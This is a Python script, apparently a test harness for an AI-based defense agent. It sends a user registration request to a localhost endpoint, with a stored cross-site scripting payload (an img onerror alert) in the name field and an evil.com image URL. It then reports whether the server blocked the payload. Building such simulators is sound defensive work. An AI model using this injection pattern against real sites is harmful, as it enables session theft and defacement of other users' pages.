import requests
import sys
import time
import json

# Target Configuration
TARGET_URL = "http://127.0.0.1:8081/users/register"

def get_custom_payload():
    print("\n" + "*"*40)
    msg = input("Enter the message for the Alert Box: ")
    print("*"*40 + "\n")
    # Escape quotes for JS
    msg = msg.replace("'", "\\'")
    return f"<img src=x onerror=\"alert('Message_from_Hacker:_ {msg}');document.body.style.backgroundColor='red';\">"

def print_banner(payload_preview):
    print("=" * 60)
    print("🚀 PROJECT DEFEND ATTACK SIMULATOR - XSS EDITION")
    print("=" * 60)
    print(f"Target Endpoint : {TARGET_URL}")
    print(f"Malicious Payload: {payload_preview[:50]}...")
    print("=" * 60)
    print("\nStand by. Initiating Cross-Site Scripting (XSS) attack...")
    print("This will attempt to inject a script into the user registration form.\n")

def run_attack():
    xss_payload = get_custom_payload()
    print_banner(xss_payload)
    
    # Use a unique email each time to avoid "User already exists" (409) error
    timestamp = int(time.time())
    unique_email = f"hacker_{timestamp}@example.com"
    
    # Malicious registration data
    payload = {
        "name": xss_payload,
        "email": unique_email,
        "password": "Password@123",
        "age": 25,
        "city": "CyberCity",
        "job": "Hacker",
        "image": "http://evil.com/hacker.jpg"
    }

    print(f"[*] Sending malicious registration request...")
    
    try:
        response = requests.post(TARGET_URL, json=payload, timeout=5)
        
        if response.status_code == 403:
            print("\n🛑 [ATTACK BLOCKED] AI DEFENSE AGENT DETECTED THE THREAT!")
            try:
                error_data = response.json()
                print(f"🛡️  Server Response: {error_data.get('error', 'Access Denied')}")
            except:
                print(f"🛡️  Server Response: {response.text}")
            print("\n[VERDICT] The AI Agent successfully identified and blocked the XSS payload.")
            
        elif response.status_code == 200 or response.status_code == 201:
            print("\n⚠️  [HACK SUCCESS] The malicious script was accepted by the server!")
            print("⚠️  The system is VULNERABLE to XSS. (Is the Defense Agent running?)")
            print("⚠️  Refresh the Admin Dashboard to see your custom alert!")
        
        else:
            print(f"\n[-] Received unexpected status code: {response.status_code}")
            print(f"[-] Response: {response.text}")

    except Exception as e:
        print(f"\n❌ [ERROR] Could not connect to the server: {e}")

if __name__ == "__main__":
    try:
        run_attack()
    except KeyboardInterrupt:
        print("\n[!] Attack cancelled by user.")
    print("\n" + "=" * 60)
    input("Press Enter to exit...")
